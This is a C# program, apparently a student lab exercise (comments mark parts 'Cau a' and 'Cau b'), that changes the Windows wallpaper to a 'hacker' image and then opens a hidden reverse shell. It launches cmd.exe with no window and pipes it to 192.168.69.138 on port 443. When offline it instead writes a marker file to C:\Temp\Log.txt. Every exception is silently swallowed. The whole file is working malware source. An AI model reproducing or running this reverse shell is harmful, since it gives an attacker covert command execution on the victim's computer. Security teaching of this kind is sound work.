using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using Microsoft.Win32;
namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;


		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		private static extern Int32 SystemParametersInfo(
		UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);

		private static readonly UInt32 SPI_SETDESKWALLPAPER = 0x14;
		private static readonly UInt32 SPIF_UPDATEINIFILE = 0x01;
		private static readonly UInt32 SPIF_SENDWININICHANGE = 0x02;
		static public void SetWallpaper(String path)
		{
			RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
			key.SetValue(@"WallpaperStyle", 0.ToString()); // 2 is stretched
			key.SetValue(@"TileWallpaper", 0.ToString());

			SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
		}
		public static void Main(string[] args)
		{
			//Cau a
			string imgWallpaper = @"C:\Windows\hacker.jpg";

			// verify    
			if (File.Exists(imgWallpaper))
			{
				SetWallpaper(imgWallpaper);
			}
			//Cau b
			if (isConnectedToInternet() == true)
            {
				try
                {
					using (TcpClient client = new TcpClient("192.168.69.138", 443))
					{
						using (Stream stream = client.GetStream())
						{
							using (StreamReader rdr = new StreamReader(stream))
							{
								streamWriter = new StreamWriter(stream);

								StringBuilder strInput = new StringBuilder();

								Process p = new Process();
								p.StartInfo.FileName = "cmd.exe";
								p.StartInfo.CreateNoWindow = true;
								p.StartInfo.UseShellExecute = false;
								p.StartInfo.RedirectStandardOutput = true;
								p.StartInfo.RedirectStandardInput = true;
								p.StartInfo.RedirectStandardError = true;
								p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
								p.Start();
								p.BeginOutputReadLine();

								while (true)
								{
									strInput.Append(rdr.ReadLine());
									//strInput.Append("\n");
									p.StandardInput.WriteLine(strInput);
									strInput.Remove(0, strInput.Length);
								}
							}
						}
					}
                }
				catch (Exception ex)
                {

                }
            }
			else
            {
				string fileName = @"C:\Temp\Log.txt";

				try
				{
					// Check if file already exists. If yes, delete it.     
					if (File.Exists(fileName))
					{
						File.Delete(fileName);
					}

					// Create a new file     
					using (FileStream fs = File.Create(fileName))
					{
						// Add some text to file    
						Byte[] title = new UTF8Encoding(true).GetBytes("RotMangRoi");
						fs.Write(title, 0, title.Length);
						byte[] author = new UTF8Encoding(true).GetBytes("-XuanKhang");
						fs.Write(author, 0, author.Length);
					}

					// Open the stream and read it back.    
					
				}
				catch (Exception Ex)
                {

                }

			}
		}

		public static bool isConnectedToInternet()
		{
			string host = "8.8.8.8";
			bool result = false;
			Ping p = new Ping();
			try
			{
				PingReply reply = p.Send(host, 3000);
				if (reply.Status == IPStatus.Success)
					return true;
			}
			catch { }
			return result;
		}
		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
		{
			StringBuilder strOutput = new StringBuilder();

			if (!String.IsNullOrEmpty(outLine.Data))
			{
				try
				{
					strOutput.Append(outLine.Data);
					streamWriter.WriteLine(strOutput);
					streamWriter.Flush();
				}
				catch (Exception err) { }
			}
		}


	}
}